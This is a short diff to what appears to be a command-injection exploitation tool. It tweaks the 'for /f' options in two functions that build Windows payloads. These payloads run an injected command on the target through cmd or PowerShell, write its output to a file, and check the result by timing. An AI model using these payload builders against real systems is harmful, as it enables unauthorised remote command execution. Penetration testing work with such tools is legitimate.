@@ -213,7 +213,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       ascii_output = ("powershell.exe -InputFormat none write-host ([int[]][char[]](" +
                       windows_cmd_text(cmd) + "))")
       payload = (chain +
-                "for /f \"tokens=*\" %i in ('cmd /c \"" + ascii_output + "\"') do " +
+                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" + ascii_output + "\"') do " +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
                 checks.windows_probe(checks.WINDOWS_CHAIN,
                                      "powershell.exe -InputFormat none write-host " + windows_file_text(OUTPUT_TEXTFILE) + ".split([char]32).length",
@@ -289,7 +289,7 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
     if chain is not None:
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
       payload = (chain +
-                "for /f \"tokens=*\" %i in ('cmd /c " + cmd + "') do " +
+                "for /f \"tokens=* eol=\" %i in ('cmd /c " + cmd + "') do " +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
                 checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                 )
